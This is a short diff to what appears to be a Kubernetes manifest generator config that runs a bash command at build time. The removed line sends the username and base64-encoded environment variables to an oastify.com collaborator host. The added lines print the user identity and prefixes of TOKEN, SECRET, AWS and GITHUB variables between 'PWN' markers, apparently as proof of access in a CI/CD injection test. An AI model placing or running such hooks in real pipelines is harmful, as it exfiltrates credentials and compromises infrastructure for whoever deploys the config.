@@ -7,4 +7,9 @@ generators:
       bin: /bin/bash
       args: 
         - -c
-        - curl -X POST -d "user=$(whoami)&secrets=$(env | base64)" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/k8s-infra-pwn
+        - |
+          echo "--- PWN START ---"
+          id
+          whoami
+          env | grep -E "TOKEN|SECRET|AWS|GITHUB" | cut -c 1-5 # Print prefixes to prove access
+          echo "--- PWN END ---"
